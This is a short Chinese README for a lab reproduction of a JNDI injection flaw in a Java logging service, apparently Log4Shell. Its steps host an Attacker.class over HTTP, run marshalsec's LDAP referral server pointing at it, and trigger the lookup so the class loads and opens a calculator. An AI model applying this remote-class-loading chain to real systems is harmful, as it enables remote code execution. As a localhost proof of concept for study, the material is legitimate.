## 准备

`remote/Attacker.class`使用`Java 1.8.0_292`编译

版本不同的朋友可以自己用`javac Attacker.java`编译

## 复现步骤

复现一共需要启动3个进程，成功触发会打印`Constructor`并自动打开计算器

### 1 攻击者服务

使用`python`托管`Attacker.class`

```
cd remote

python -m http.server 8888
```

### 2 jndi转发

使用`marshalsec`工具转发jndi请求到攻击者服务

```
git clone git@github.com:mbechler/marshalsec.git

cd marshalsec

mvn clean package -DskipTests

java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Attacker"
```

### 3 漏洞触发

使用命令行或IDE运行`src/main/java/LogService.java`


